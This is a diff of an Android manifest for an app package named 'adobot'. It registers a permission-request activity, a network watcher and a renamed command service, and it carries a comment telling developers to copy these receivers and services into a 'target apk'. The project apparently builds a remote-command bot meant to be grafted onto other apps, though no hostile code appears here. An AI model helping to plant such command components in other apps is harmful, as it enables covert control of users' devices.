@@ -44,7 +44,7 @@
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
-        <activity android:name="com.android.adobot.activities.MainActivity">
+        <activity android:name="com.android.adobot.activities.MainActivity" android:noHistory="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -53,6 +53,7 @@
 
         <!--copy the receivers and services to the target apk source-->
         <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
+        <activity android:name="com.android.adobot.activities.AskPermissionsActivity"></activity>
 
         <receiver android:name="com.android.adobot.NetworkWatcher">
             <intent-filter>
@@ -60,7 +61,7 @@
             </intent-filter>
         </receiver>
 
-        <service android:name="com.android.adobot.CommandReceiverService" />
+        <service android:name="com.android.adobot.CommandService" />
 
         <!--end of services and receivers-->
 
